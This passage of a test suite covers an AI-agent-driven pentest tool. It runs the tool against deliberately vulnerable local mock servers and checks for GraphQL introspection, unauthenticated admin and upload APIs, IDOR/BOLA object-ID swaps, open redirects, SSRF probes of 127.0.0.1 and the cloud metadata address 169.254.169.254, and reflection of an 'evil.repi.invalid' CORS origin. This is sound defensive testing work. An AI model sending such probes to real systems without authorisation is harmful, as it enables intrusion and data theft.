				"--workers",
				"2",
				"--json",
				"--timeout-ms=5000",
			],
			{
				encoding: "utf8",
				env: {
					...process.env,
					REPI_CODING_AGENT_DIR: agentDir,
				},
				timeout: 15_000,
			},
		);

		expect(result.status, `${result.stderr}\n${result.stdout}`).toBe(0);
		const report = JSON.parse(result.stdout) as {
			target: { lane: string };
			nextQueue: string[];
			swarm: { exit: number; stdoutTail: string };
		};
		expect(report.target.lane).toBe("js-reverse");
		expect(report.swarm.exit).toBe(0);
		expect(report.swarm.stdoutTail).toContain('"--route"');
		expect(report.swarm.stdoutTail).toContain('"js-reverse"');
		expect(report.swarm.stdoutTail).toContain('"kimchi"');
		expect(report.swarm.stdoutTail).toContain('"kimi-k2.7"');
		expect(report.nextQueue.some((command) => command.includes("--route 'js-reverse'"))).toBe(true);
	});

	it("expands full-spectrum text engagements across all swarm routes", () => {
		const scriptDir = join(workspace, "scripts", "reverse-agent");
		mkdirSync(scriptDir, { recursive: true });
		writeFileSync(
			join(scriptDir, "repi-swarm-llm-run.mjs"),
			`#!/usr/bin/env node\nconsole.log(JSON.stringify({ok:true,args:process.argv.slice(2)}));\n`,
		);

		const result = spawnSync(
			process.execPath,
			[
				ENGAGE,
				workspace,
				"full-spectrum all-routes reverse/pentest audit",
				"--no-mission",
				"--swarm",
				"--provider",
				"kimchi",
				"--model",
				"kimi-k2.7",
				"--json",
				"--timeout-ms=5000",
			],
			{
				encoding: "utf8",
				env: {
					...process.env,
					REPI_CODING_AGENT_DIR: agentDir,
				},
				timeout: 15_000,
			},
		);

		expect(result.status, `${result.stderr}\n${result.stdout}`).toBe(0);
		const report = JSON.parse(result.stdout) as {
			target: { lane: string };
			nextQueue: string[];
			swarm: { exit: number; stdoutTail: string };
		};
		expect(report.target.lane).toBe("reverse-pentest-general");
		expect(report.swarm.exit).toBe(0);
		expect(report.swarm.stdoutTail).toContain('"--route"');
		expect(report.swarm.stdoutTail).toContain("native-pwn,web-api,js-reverse,mobile,pcap-dfir");
		expect(report.swarm.stdoutTail).toContain("agent-boundary");
		expect(report.nextQueue.some((command) => command.includes("--route 'native-pwn,web-api,js-reverse"))).toBe(true);
	});

	it("defaults live swarm dispatch to kimchi provider when provider flags are omitted", () => {
		const scriptDir = join(workspace, "scripts", "reverse-agent");
		mkdirSync(scriptDir, { recursive: true });
		writeFileSync(
			join(scriptDir, "repi-swarm-llm-run.mjs"),
			`#!/usr/bin/env node\nconsole.log(JSON.stringify({ok:true,args:process.argv.slice(2)}));\n`,
		);
		const targetDir = join(workspace, "default-provider-app");
		mkdirSync(targetDir, { recursive: true });
		writeFileSync(join(targetDir, "package.json"), JSON.stringify({ scripts: { build: "vite build" } }));
		writeFileSync(join(targetDir, "app.js"), "fetch('/api/items')\n");

		const result = spawnSync(
			process.execPath,
			[ENGAGE, workspace, targetDir, "--no-mission", "--swarm", "--workers", "1", "--json", "--timeout-ms=5000"],
			{
				encoding: "utf8",
				env: {
					...process.env,
					REPI_CODING_AGENT_DIR: agentDir,
				},
				timeout: 15_000,
			},
		);

		expect(result.status, `${result.stderr}\n${result.stdout}`).toBe(0);
		const report = JSON.parse(result.stdout) as {
			swarm: { exit: number; provider: string; model: string; stdoutTail: string };
			nextQueue: string[];
		};
		expect(report.swarm).toMatchObject({ exit: 0, provider: "kimchi", model: "kimi-k2.7" });
		expect(report.swarm.stdoutTail).toContain('"--provider"');
		expect(report.swarm.stdoutTail).toContain('"kimchi"');
		expect(report.swarm.stdoutTail).toContain('"kimi-k2.7"');
		expect(report.nextQueue.some((command) => command.includes("--provider 'kimchi'"))).toBe(true);
		expect(report.nextQueue.some((command) => command.includes("--model 'kimi-k2.7'"))).toBe(true);
	});

	it("extracts structured swarm merge summaries and repair commands from noisy JSON output", () => {
		const scriptDir = join(workspace, "scripts", "reverse-agent");
		mkdirSync(scriptDir, { recursive: true });
		writeFileSync(
			join(scriptDir, "repi-swarm-llm-run.mjs"),
			`#!/usr/bin/env node\nconsole.log("swarm prelude {not json}");\nconsole.log(JSON.stringify({noise:true}));\nconsole.log(JSON.stringify({ok:false,runId:"swarm-run-1",evidenceRoot:"/tmp/repi-swarm-evidence",mergeFailureReason:"route proof incomplete; missing proof-ready route(s): js-reverse",merge:{finalPromotionReady:false,proofPromotionReady:false,routeProofReady:false,routeCoverage:{complete:true,coveredCount:2,routeCount:2,uncoveredCount:0},proofReadyRouteIds:["web-api"],missingProofRoutes:[{id:"js-reverse",domain:"Frontend / JS reverse"}],routeReadinessRows:[{routeId:"web-api",proofReady:true,promotedClaimIds:["web-proof"],proofReadyPromotedClaimIds:["web-proof"],missing:[]},{routeId:"js-reverse",proofReady:false,promotedClaimIds:["js-weak"],proofReadyPromotedClaimIds:[],missing:["proof-ready promoted claim"]}],promotedClaims:[{claimId:"web-proof"},{claimId:"js-weak"}],proofReadyPromotedClaims:[{claimId:"web-proof"}],nextCommands:["repi swarm run target --route 'js-reverse' --provider 'kimchi' --model 'kimi-k2.7' --prompt 'check secret token handling'"]}}));\nprocess.exit(1);\n`,
		);

		const result = spawnSync(
			process.execPath,
			[
				ENGAGE,
				workspace,
				"full-spectrum all-routes reverse/pentest audit",
				"--no-mission",
				"--swarm",
				"--workers",
				"2",
				"--json",
				"--timeout-ms=5000",
			],
			{
				encoding: "utf8",
				env: {
					...process.env,
					REPI_CODING_AGENT_DIR: agentDir,
				},
				timeout: 15_000,
			},
		);

		expect(result.status, `${result.stderr}\n${result.stdout}`).toBe(0);
		const report = JSON.parse(result.stdout) as {
			nextQueue: string[];
			swarm: {
				exit: number;
				provider: string;
				model: string;
				parsed: boolean;
				summary: {
					ok: boolean;
					runId: string;
					evidenceRoot: string;
					mergeFailureReason: string;
					finalPromotionReady: boolean;
					routeProofReady: boolean;
					proofReadyRouteIds: string[];
					missingProofRoutes: string[];
					promotedClaims: number;
					proofReadyPromotedClaims: number;
					nextCommands: string[];
					routeReadinessRows: Array<{ routeId: string; proofReady: boolean; missing: string[] }>;
				};
			};
		};
		expect(report.swarm.exit).toBe(1);
		expect(report.swarm).toMatchObject({ provider: "kimchi", model: "kimi-k2.7", parsed: true });
		expect(report.swarm.summary).toMatchObject({
			ok: false,
			runId: "swarm-run-1",
			evidenceRoot: "/tmp/repi-swarm-evidence",
			finalPromotionReady: false,
			routeProofReady: false,
			proofReadyRouteIds: ["web-api"],
			missingProofRoutes: ["js-reverse"],
			promotedClaims: 2,
			proofReadyPromotedClaims: 1,
		});
		expect(report.swarm.summary.mergeFailureReason).toContain("route proof incomplete");
		expect(report.swarm.summary.routeReadinessRows.find((row) => row.routeId === "js-reverse")).toMatchObject({
			proofReady: false,
			missing: ["proof-ready promoted claim"],
		});
		expect(report.swarm.summary.nextCommands[0]).toContain("--route 'js-reverse'");
		expect(report.nextQueue.some((command) => command.includes("--route 'js-reverse'"))).toBe(true);
	});

	it("probes GraphQL and OpenAPI schemas into bounded evidence artifacts", async () => {
		const schemaSecret = "schemaSecretToken123456789";
		const server = spawn(
			process.execPath,
			[
				"-e",
				`const {createServer}=require("node:http");
const server=createServer((request,response)=>{
	if(request.url==="/graphql"){
		let body="";
		request.on("data",(chunk)=>body+=chunk);
		request.on("end",()=>{
			if(request.method!=="POST"){
				response.writeHead(405,{"content-type":"application/json"});
				response.end(JSON.stringify({errors:[{message:"POST required"}]}));
				return;
			}
			if(body.includes("__schema")){
				response.writeHead(200,{"content-type":"application/json"});
				response.end(JSON.stringify({data:{__schema:{
					queryType:{name:"Query"},
					mutationType:{name:"Mutation"},
					subscriptionType:null,
					directives:[{name:"include"},{name:"skip"}],
					types:[
						{kind:"OBJECT",name:"Query",fields:[{name:"viewer"},{name:"adminSecrets"}]},
						{kind:"OBJECT",name:"Mutation",fields:[{name:"updateOrder"},{name:"deleteUser"}]}
					]
				}}, secret:"${schemaSecret}"}));
				return;
			}
			response.writeHead(200,{"content-type":"application/json"});
			response.end(JSON.stringify({data:{__typename:"Query"}, secret:"${schemaSecret}"}));
		});
		return;
	}
	if(request.url==="/openapi.json"){
		response.writeHead(200,{"content-type":"application/json"});
			response.end(JSON.stringify({
			openapi:"3.0.0",
			info:{title:"REPI Test API"},
			paths:{
				"/api/orders":{get:{operationId:"listOrders",tags:["orders"],security:[{bearerAuth:[]}]}},
				"/api/admin":{post:{operationId:"resetAdmin",tags:["admin"]}},
				"/api/upload":{post:{operationId:"uploadFile",tags:["files"],requestBody:{content:{"multipart/form-data":{schema:{type:"object"}}}}}}
			},
			components:{securitySchemes:{bearerAuth:{type:"http",scheme:"bearer"}}},
			"x-secret":"${schemaSecret}"
		}));
		return;
	}
	if(request.url.startsWith("/api/")){
		response.writeHead(200,{"content-type":"application/json"});
		response.end(JSON.stringify({ok:true}));
		return;
	}
	response.writeHead(200,{"content-type":"text/html"});
	response.end("<html><a href=\\"/graphql\\">graphql</a><a href=\\"/openapi.json\\">openapi</a></html>");
});
server.listen(0,"127.0.0.1",()=>console.log(server.address().port));`,
			],
			{ stdio: ["ignore", "pipe", "pipe"] },
		);
		const port = await new Promise<string>((resolve, reject) => {
			const timer = setTimeout(() => reject(new Error("server did not start")), 5000);
			server.stdout.once("data", (chunk) => {
				clearTimeout(timer);
				resolve(String(chunk).trim());
			});
			server.once("error", reject);
			server.once("exit", (code) => {
				if (code !== null && code !== 0) reject(new Error(`server exited ${code}`));
			});
		});
		try {
			const result = spawnSync(
				process.execPath,
				[ENGAGE, workspace, `http://127.0.0.1:${port}/`, "--no-mission", "--json", "--timeout-ms=5000"],
				{
					encoding: "utf8",
					env: {
						...process.env,
						REPI_CODING_AGENT_DIR: agentDir,
					},
					timeout: 15_000,
				},
			);
			expect(result.status, `${result.stderr}\n${result.stdout}`).toBe(0);
			const report = JSON.parse(result.stdout) as {
				artifactDir: string;
				commands: Array<{ id: string; stdout: string }>;
				nextQueue: string[];
				summary: { anchors: string[] };
			};
			expect(JSON.stringify(report)).not.toContain(schemaSecret);
			expect(report.commands.map((row) => row.id)).toContain("web-api-schema-probes");
			expect(report.commands.map((row) => row.id)).toContain("web-exploit-claims");
			expect(report.commands.some((row) => row.id.startsWith("web-graphql-"))).toBe(true);
			expect(report.commands.some((row) => row.id.startsWith("web-openapi-"))).toBe(true);
			expect(report.summary.anchors).toContain("API schema anchors");
			expect(report.summary.anchors).toContain("web exploit claim anchors");
			expect(report.nextQueue.some((command) => command.includes("web-api-schema-probes.json"))).toBe(true);
			expect(report.nextQueue.some((command) => command.includes("web-exploit-claims.json"))).toBe(true);
			const schemaPath = join(report.artifactDir, "web-api-schema-probes.json");
			const claimsPath = join(report.artifactDir, "web-exploit-claims.json");
			expect(existsSync(schemaPath)).toBe(true);
			expect(existsSync(claimsPath)).toBe(true);
			expect(statSync(schemaPath).mode & 0o777).toBe(0o600);
			expect(statSync(claimsPath).mode & 0o777).toBe(0o600);
			const schema = JSON.parse(readFileSync(schemaPath, "utf8")) as {
				rows: Array<{
					kind: string;
					looksGraphql?: boolean;
					bodySample?: string;
					introspection?: {
						enabled: boolean;
						queryType: string;
						mutationType: string;
						typeCount: number;
						fieldCount: number;
						queryFields: string[];
						mutationFields: string[];
						directives: string[];
					};
					risks?: string[];
					openapi?: {
						pathCount: number;
						operationCount: number;
						securitySchemes: Array<{ name: string; type: string; scheme: string }>;
						pathSamples: Array<{ path: string; methods: string[] }>;
						operationSamples: Array<{
							path: string;
							method: string;
							operationId: string;
							authRequired: boolean;
							requestContentTypes: string[];
							risks: string[];
						}>;
						risks: string[];
					};
				}>;
				risks: string[];
			};
			expect(JSON.stringify(schema)).not.toContain(schemaSecret);
			expect(schema.rows.some((row) => row.kind === "graphql" && row.looksGraphql)).toBe(true);
			const introspection = schema.rows.find((row) => row.kind === "graphql-introspection")?.introspection;
			expect(introspection).toMatchObject({
				enabled: true,
				queryType: "Query",
				mutationType: "Mutation",
				typeCount: 2,
				fieldCount: 4,
				queryFields: ["viewer", "adminSecrets"],
				mutationFields: ["updateOrder", "deleteUser"],
				directives: ["include", "skip"],
			});
			expect(schema.rows.find((row) => row.kind === "graphql-introspection")?.risks).toEqual(
				expect.arrayContaining([
					"graphql-introspection-enabled",
					"graphql-mutation-surface",
					"graphql-sensitive-query-field-signal",
				]),
			);
			expect(schema.risks).toEqual(
				expect.arrayContaining([
					"graphql-introspection-enabled",
					"graphql-mutation-surface",
					"graphql-sensitive-query-field-signal",
				]),
			);
			const openapi = schema.rows.find((row) => row.kind === "openapi" && row.openapi)?.openapi;
			expect(openapi?.pathCount).toBe(3);
			expect(openapi?.operationCount).toBe(3);
			expect(openapi?.securitySchemes).toContainEqual({ name: "bearerAuth", type: "http", scheme: "bearer" });
			expect(openapi?.pathSamples.some((sample) => sample.path === "/api/orders")).toBe(true);
			expect(openapi?.operationSamples).toEqual(
				expect.arrayContaining([
					expect.objectContaining({
						path: "/api/orders",
						method: "GET",
						operationId: "listOrders",
						authRequired: true,
						risks: [],
					}),
					expect.objectContaining({
						path: "/api/admin",
						method: "POST",
						operationId: "resetAdmin",
						authRequired: false,
						risks: expect.arrayContaining([
							"openapi-unauthenticated-sensitive-operation",
							"openapi-write-operation-surface",
							"openapi-unauthenticated-write-operation",
							"openapi-unauthenticated-admin-operation",
						]),
					}),
					expect.objectContaining({
						path: "/api/upload",
						method: "POST",
						operationId: "uploadFile",
						authRequired: false,
						requestContentTypes: ["multipart/form-data"],
						risks: expect.arrayContaining(["openapi-upload-surface", "openapi-unauthenticated-upload-surface"]),
					}),
				]),
			);
			expect(openapi?.risks).toEqual(
				expect.arrayContaining([
					"openapi-unauthenticated-sensitive-operation",
					"openapi-write-operation-surface",
					"openapi-unauthenticated-write-operation",
					"openapi-unauthenticated-admin-operation",
					"openapi-upload-surface",
					"openapi-unauthenticated-upload-surface",
				]),
			);
			expect(schema.risks).toEqual(
				expect.arrayContaining([
					"openapi-unauthenticated-admin-operation",
					"openapi-unauthenticated-upload-surface",
				]),
			);
			const claims = JSON.parse(readFileSync(claimsPath, "utf8")) as {
				proofReady: boolean;
				claimLedger: Array<{ claimType: string; verdict: string }>;
			};
			expect(JSON.stringify(claims)).not.toContain(schemaSecret);
			expect(claims.proofReady).toBe(true);
			expect(
				claims.claimLedger.some(
					(claim) => claim.claimType === "graphql-introspection-enabled" && claim.verdict === "promoted",
				),
			).toBe(true);
			expect(
				claims.claimLedger.some(
					(claim) => claim.claimType === "openapi-unauthenticated-admin-operation" && claim.verdict === "promoted",
				),
			).toBe(true);
			expect(
				claims.claimLedger.some(
					(claim) => claim.claimType === "openapi-unauthenticated-upload-surface" && claim.verdict === "promoted",
				),
			).toBe(true);
			expect(collectTmp(agentDir)).toEqual([]);
		} finally {
			server.kill("SIGTERM");
			await new Promise<void>((resolve) => server.once("exit", () => resolve()));
		}
	});

	it("builds object authorization mutation matrices for IDOR/BOLA leads", async () => {
		const cookieSecret = "objectSessionSecret123456789";
		const server = spawn(
			process.execPath,
			[
				"-e",
				`const {createServer}=require("node:http");
const server=createServer((request,response)=>{
	if(request.url.startsWith("/api/orders/")){
		const hasSession=(request.headers.cookie||"").includes("${cookieSecret}");
		if(!hasSession){
			response.writeHead(401,{"content-type":"application/json"});
			response.end(JSON.stringify({error:"login required"}));
			return;
		}
		const id=request.url.split("/").pop();
		response.writeHead(200,{"content-type":"application/json"});
		response.end(JSON.stringify({id, owner:"alice"}));
		return;
	}
	response.writeHead(200,{"content-type":"text/html","set-cookie":"sid=${cookieSecret}; HttpOnly"});
	response.end("<html><a href=\\"/api/orders/1001\\">order</a></html>");
});
server.listen(0,"127.0.0.1",()=>console.log(server.address().port));`,
			],
			{ stdio: ["ignore", "pipe", "pipe"] },
		);
		const port = await new Promise<string>((resolve, reject) => {
			const timer = setTimeout(() => reject(new Error("server did not start")), 5000);
			server.stdout.once("data", (chunk) => {
				clearTimeout(timer);
				resolve(String(chunk).trim());
			});
			server.once("error", reject);
			server.once("exit", (code) => {
				if (code !== null && code !== 0) reject(new Error(`server exited ${code}`));
			});
		});
		try {
			const result = spawnSync(
				process.execPath,
				[ENGAGE, workspace, `http://127.0.0.1:${port}/`, "--no-mission", "--json", "--timeout-ms=5000"],
				{
					encoding: "utf8",
					env: {
						...process.env,
						REPI_CODING_AGENT_DIR: agentDir,
					},
					timeout: 15_000,
				},
			);
			expect(result.status, `${result.stderr}\n${result.stdout}`).toBe(0);
			const report = JSON.parse(result.stdout) as {
				artifactDir: string;
				commands: Array<{ id: string; stdout: string }>;
				nextQueue: string[];
				summary: { anchors: string[] };
			};
			expect(JSON.stringify(report)).not.toContain(cookieSecret);
			expect(report.commands.map((row) => row.id)).toContain("web-object-matrix");
			expect(report.commands.map((row) => row.id)).toContain("web-exploit-claims");
			expect(report.commands.some((row) => row.id.includes("web-object-1-cookie-session-variant"))).toBe(true);
			expect(report.summary.anchors).toContain("object authorization anchors");
			expect(report.summary.anchors).toContain("web exploit claim anchors");
			expect(report.nextQueue.some((command) => command.includes("web-object-matrix.json"))).toBe(true);
			expect(report.nextQueue.some((command) => command.includes("web-exploit-claims.json"))).toBe(true);
			expect(report.nextQueue.some((command) => command.includes("claimLedger"))).toBe(true);
			const matrixPath = join(report.artifactDir, "web-object-matrix.json");
			const claimsPath = join(report.artifactDir, "web-exploit-claims.json");
			expect(existsSync(matrixPath)).toBe(true);
			expect(existsSync(claimsPath)).toBe(true);
			expect(statSync(matrixPath).mode & 0o777).toBe(0o600);
			expect(statSync(claimsPath).mode & 0o777).toBe(0o600);
			const matrix = JSON.parse(readFileSync(matrixPath, "utf8")) as {
				signalCount: number;
				rows: Array<{
					principal: string;
					reason: string;
					sourceUrl: string;
					variantUrl: string;
					source: { status: number; responseSha256: string };
					variant: { status: number; responseSha256: string };
					bolaSignal: boolean;
				}>;
			};
			expect(JSON.stringify(matrix)).not.toContain(cookieSecret);
			expect(matrix.signalCount).toBeGreaterThanOrEqual(1);
			expect(matrix.rows.some((row) => row.reason.startsWith("path-number:1001"))).toBe(true);
			expect(
				matrix.rows.some(
					(row) =>
						row.principal === "anonymous" &&
						row.sourceUrl.includes("/api/orders/1001") &&
						row.variantUrl.includes("/api/orders/1002") &&
						row.variant.status === 401,
				),
			).toBe(true);
			expect(
				matrix.rows.some(
					(row) =>
						row.principal === "cookie-session" &&
						row.source.status === 200 &&
						row.variant.status === 200 &&
						row.bolaSignal,
				),
			).toBe(true);
			expect(matrix.rows.every((row) => /^[a-f0-9]{64}$/.test(row.source.responseSha256))).toBe(true);
			const claims = JSON.parse(readFileSync(claimsPath, "utf8")) as {
				proofReady: boolean;
				exploitProofReady: boolean;
				claimLedger: Array<{ claimType: string; verdict: string }>;
				composedPaths: Array<{ claimType: string; verdict: string }>;
				promotionReport: { promotedClaims: Array<{ claimType: string }>; blockers: string[] };
			};
			expect(JSON.stringify(claims)).not.toContain(cookieSecret);
			expect(claims.proofReady).toBe(true);
			expect(claims.exploitProofReady).toBe(true);
			expect(
				claims.claimLedger.some(
					(claim) => claim.claimType === "web-session-auth-differential" && claim.verdict === "promoted",
				),
			).toBe(true);
			expect(
				claims.claimLedger.some(
					(claim) => claim.claimType === "web-object-authz-bola-signal" && claim.verdict === "promoted",
				),
			).toBe(true);
			expect(
				claims.composedPaths.some(
					(claim) => claim.claimType === "web-authz-object-proof-path" && claim.verdict === "promoted",
				),
			).toBe(true);
			expect(
				claims.promotionReport.promotedClaims.some((claim) => claim.claimType === "web-authz-object-proof-path"),
			).toBe(true);
			expect(collectTmp(agentDir)).toEqual([]);
		} finally {
			server.kill("SIGTERM");
			await new Promise<void>((resolve) => server.once("exit", () => resolve()));
		}
	});

	it("builds open redirect mutation matrices without following external canaries", async () => {
		const server = spawn(
			process.execPath,
			[
				"-e",
				`const {createServer}=require("node:http");
const server=createServer((request,response)=>{
	const url=new URL(request.url,"http://"+request.headers.host);
	if(url.pathname==="/redirect"){
		response.writeHead(302,{location:url.searchParams.get("next")||"/"});
		response.end();
		return;
	}
	response.writeHead(200,{"content-type":"text/html"});
	response.end("<html><a href=\\"/redirect?next=/dashboard\\">continue</a></html>");
});
server.listen(0,"127.0.0.1",()=>console.log(server.address().port));`,
			],
			{ stdio: ["ignore", "pipe", "pipe"] },
		);
		const port = await new Promise<string>((resolve, reject) => {
			const timer = setTimeout(() => reject(new Error("server did not start")), 5000);
			server.stdout.once("data", (chunk) => {
				clearTimeout(timer);
				resolve(String(chunk).trim());
			});
			server.once("error", reject);
			server.once("exit", (code) => {
				if (code !== null && code !== 0) reject(new Error(`server exited ${code}`));
			});
		});
		try {
			const result = spawnSync(
				process.execPath,
				[ENGAGE, workspace, `http://127.0.0.1:${port}/`, "--no-mission", "--json", "--timeout-ms=5000"],
				{
					encoding: "utf8",
					env: {
						...process.env,
						REPI_CODING_AGENT_DIR: agentDir,
					},
					timeout: 15_000,
				},
			);
			expect(result.status, `${result.stderr}\n${result.stdout}`).toBe(0);
			const report = JSON.parse(result.stdout) as {
				artifactDir: string;
				commands: Array<{ id: string; stdout: string }>;
				nextQueue: string[];
				summary: { anchors: string[] };
			};
			expect(report.commands.map((row) => row.id)).toContain("web-redirect-matrix");
			expect(report.commands.some((row) => row.id.startsWith("web-redirect-") && row.id.includes("-next"))).toBe(
				true,
			);
			expect(report.summary.anchors).toContain("open redirect anchors");
			expect(report.nextQueue.some((command) => command.includes("web-redirect-matrix.json"))).toBe(true);
			const redirectPath = join(report.artifactDir, "web-redirect-matrix.json");
			expect(existsSync(redirectPath)).toBe(true);
			expect(statSync(redirectPath).mode & 0o777).toBe(0o600);
			const matrix = JSON.parse(readFileSync(redirectPath, "utf8")) as {
				riskCount: number;
				risks: string[];
				rows: Array<{
					param: string;
					status: number;
					location: string;
					locationHost: string;
					canaryLocation: boolean;
					risks: string[];
				}>;
			};
			expect(matrix.riskCount).toBeGreaterThanOrEqual(1);
			expect(matrix.risks).toContain("open-redirect-external-location");
			expect(
				matrix.rows.some(
					(row) =>
						row.param === "next" &&
						row.status === 302 &&
						row.location === "https://repi.invalid/open-redirect" &&
						row.locationHost === "repi.invalid" &&
						row.canaryLocation &&
						row.risks.includes("open-redirect-external-location"),
				),
			).toBe(true);
			expect(collectTmp(agentDir)).toEqual([]);
		} finally {
			server.kill("SIGTERM");
			await new Promise<void>((resolve) => server.once("exit", () => resolve()));
		}
	});

	it("builds SSRF mutation matrices for URL-fetch parameters", async () => {
		const server = spawn(
			process.execPath,
			[
				"-e",
				`const {createServer}=require("node:http");
const server=createServer((request,response)=>{
	const url=new URL(request.url,"http://"+request.headers.host);
	if(url.pathname==="/fetch"){
		const target=url.searchParams.get("url")||"";
		response.writeHead(200,{"content-type":"text/plain"});
		if(target.includes("127.0.0.1")){
			response.end("repi-ssrf-canary loopback fetch attempted");
			return;
		}
		if(target.includes("169.254.169.254")){
			response.end("latest/meta-data instance-id i-repi-test");
			return;
		}
		response.end("fetched external placeholder");
		return;
	}
	response.writeHead(200,{"content-type":"text/html"});
	response.end("<html><a href=\\"/fetch?url=https://example.test/resource\\">fetch</a></html>");
});
server.listen(0,"127.0.0.1",()=>console.log(server.address().port));`,
			],
			{ stdio: ["ignore", "pipe", "pipe"] },
		);
		const port = await new Promise<string>((resolve, reject) => {
			const timer = setTimeout(() => reject(new Error("server did not start")), 5000);
			server.stdout.once("data", (chunk) => {
				clearTimeout(timer);
				resolve(String(chunk).trim());
			});
			server.once("error", reject);
			server.once("exit", (code) => {
				if (code !== null && code !== 0) reject(new Error(`server exited ${code}`));
			});
		});
		try {
			const result = spawnSync(
				process.execPath,
				[ENGAGE, workspace, `http://127.0.0.1:${port}/`, "--no-mission", "--json", "--timeout-ms=5000"],
				{
					encoding: "utf8",
					env: {
						...process.env,
						REPI_CODING_AGENT_DIR: agentDir,
					},
					timeout: 15_000,
				},
			);
			expect(result.status, `${result.stderr}\n${result.stdout}`).toBe(0);
			const report = JSON.parse(result.stdout) as {
				artifactDir: string;
				commands: Array<{ id: string; stdout: string }>;
				nextQueue: string[];
				summary: { anchors: string[] };
			};
			expect(report.commands.map((row) => row.id)).toContain("web-ssrf-matrix");
			expect(report.commands.some((row) => row.id.includes("web-ssrf-") && row.id.includes("-loopback"))).toBe(true);
			expect(report.summary.anchors).toContain("SSRF parameter anchors");
			expect(report.nextQueue.some((command) => command.includes("web-ssrf-matrix.json"))).toBe(true);
			const ssrfPath = join(report.artifactDir, "web-ssrf-matrix.json");
			expect(existsSync(ssrfPath)).toBe(true);
			expect(statSync(ssrfPath).mode & 0o777).toBe(0o600);
			const matrix = JSON.parse(readFileSync(ssrfPath, "utf8")) as {
				riskCount: number;
				risks: string[];
				rows: Array<{
					param: string;
					kind: string;
					payloadHost: string;
					canaryEvidence: boolean;
					bodyDifferential: boolean;
					variant: { bodySample: string; responseSha256: string };
					risks: string[];
				}>;
			};
			expect(matrix.riskCount).toBeGreaterThanOrEqual(2);
			expect(matrix.risks).toEqual(
				expect.arrayContaining([
					"ssrf-loopback-canary-signal",
					"ssrf-metadata-service-signal",
					"ssrf-response-differential",
				]),
			);
			expect(
				matrix.rows.some(
					(row) =>
						row.param === "url" &&
						row.kind === "loopback" &&
						row.payloadHost === "127.0.0.1:1" &&
						row.canaryEvidence &&
						row.bodyDifferential &&
						row.variant.bodySample.includes("repi-ssrf-canary"),
				),
			).toBe(true);
			expect(
				matrix.rows.some(
					(row) =>
						row.param === "url" &&
						row.kind === "metadata" &&
						row.payloadHost === "169.254.169.254" &&
						row.canaryEvidence &&
						row.variant.bodySample.includes("latest/meta-data"),
				),
			).toBe(true);
			expect(matrix.rows.every((row) => /^[a-f0-9]{64}$/.test(row.variant.responseSha256))).toBe(true);
			expect(collectTmp(agentDir)).toEqual([]);
		} finally {
			server.kill("SIGTERM");
			await new Promise<void>((resolve) => server.once("exit", () => resolve()));
		}
	});

	it("builds CORS reflection and preflight matrices for browser-side auth risk", async () => {
		const cookieSecret = "corsSessionSecret123456789";
		const server = spawn(
			process.execPath,
			[
				"-e",
				`const {createServer}=require("node:http");
const server=createServer((request,response)=>{
	const origin=request.headers.origin;
	if(request.url.startsWith("/api/private")){
		const headers={"content-type":"application/json"};
		if(origin){
			headers["access-control-allow-origin"]=origin;
			headers["access-control-allow-credentials"]="true";
			headers["access-control-allow-methods"]="GET, PUT, DELETE";
			headers["access-control-allow-headers"]="authorization,content-type";
		}
		response.writeHead(request.method==="OPTIONS"?204:200,headers);
		response.end(request.method==="OPTIONS"?"":JSON.stringify({ok:true}));
		return;
	}
	response.writeHead(200,{"content-type":"text/html","set-cookie":"sid=${cookieSecret}; HttpOnly"});
	response.end("<html><a href=\\"/api/private\\">private</a></html>");
});
server.listen(0,"127.0.0.1",()=>console.log(server.address().port));`,
			],
			{ stdio: ["ignore", "pipe", "pipe"] },
		);
		const port = await new Promise<string>((resolve, reject) => {
			const timer = setTimeout(() => reject(new Error("server did not start")), 5000);
			server.stdout.once("data", (chunk) => {
				clearTimeout(timer);
				resolve(String(chunk).trim());
			});
			server.once("error", reject);
			server.once("exit", (code) => {
				if (code !== null && code !== 0) reject(new Error(`server exited ${code}`));
			});
		});
		try {
			const result = spawnSync(
				process.execPath,
				[ENGAGE, workspace, `http://127.0.0.1:${port}/`, "--no-mission", "--json", "--timeout-ms=5000"],
				{
					encoding: "utf8",
					env: {
						...process.env,
						REPI_CODING_AGENT_DIR: agentDir,
					},
					timeout: 15_000,
				},
			);
			expect(result.status, `${result.stderr}\n${result.stdout}`).toBe(0);
			const report = JSON.parse(result.stdout) as {
				artifactDir: string;
				commands: Array<{ id: string; stdout: string }>;
				nextQueue: string[];
				summary: { anchors: string[] };
			};
			expect(JSON.stringify(report)).not.toContain(cookieSecret);
			expect(report.commands.map((row) => row.id)).toContain("web-cors-matrix");
			expect(report.commands.some((row) => row.id.includes("web-cors-") && row.id.endsWith("-preflight"))).toBe(
				true,
			);
			expect(report.summary.anchors).toContain("CORS policy anchors");
			expect(report.nextQueue.some((command) => command.includes("web-cors-matrix.json"))).toBe(true);
			const corsPath = join(report.artifactDir, "web-cors-matrix.json");
			expect(existsSync(corsPath)).toBe(true);
			expect(statSync(corsPath).mode & 0o777).toBe(0o600);
			const cors = JSON.parse(readFileSync(corsPath, "utf8")) as {
				riskCount: number;
				risks: string[];
				session: { cookieNames: string[] };
				rows: Array<{
					mode: string;
					url: string;
					allowOrigin: string;
					allowCredentials: boolean;
					reflectedOrigin: boolean;
					varyOrigin: boolean;
					risks: string[];
				}>;
			};
			expect(JSON.stringify(cors)).not.toContain(cookieSecret);
			expect(cors.session.cookieNames).toContain("sid");
			expect(cors.riskCount).toBeGreaterThanOrEqual(1);
			expect(cors.risks).toEqual(
				expect.arrayContaining([
					"cors-reflected-origin-with-credentials",
					"cors-missing-vary-origin",
					"cors-dangerous-methods-exposed",
				]),
			);
			expect(
				cors.rows.some(
					(row) =>
						row.url.includes("/api/private") &&
						row.allowOrigin === "https://evil.repi.invalid" &&
						row.allowCredentials &&
						row.reflectedOrigin &&
						!row.varyOrigin,
				),
			).toBe(true);
			expect(collectTmp(agentDir)).toEqual([]);
		} finally {
			server.kill("SIGTERM");
			await new Promise<void>((resolve) => server.once("exit", () => resolve()));
		}
	});

	it("summarizes cookie attributes and browser security headers without leaking cookie values", async () => {
		const cookieSecret = "postureCookieSecret123456789";
		const server = spawn(
			process.execPath,
			[
				"-e",
				`const {createServer}=require("node:http");
const server=createServer((request,response)=>{
	response.writeHead(200,{
		"content-type":"text/html",
		"set-cookie":"sid=${cookieSecret}; Path=/",
		"content-security-policy":"default-src 'self' 'unsafe-inline'",
		"referrer-policy":"no-referrer"
	});
	response.end("<html><a href=\\"/api/profile\\">profile</a></html>");
});
server.listen(0,"127.0.0.1",()=>console.log(server.address().port));`,
			],
			{ stdio: ["ignore", "pipe", "pipe"] },
		);
		const port = await new Promise<string>((resolve, reject) => {
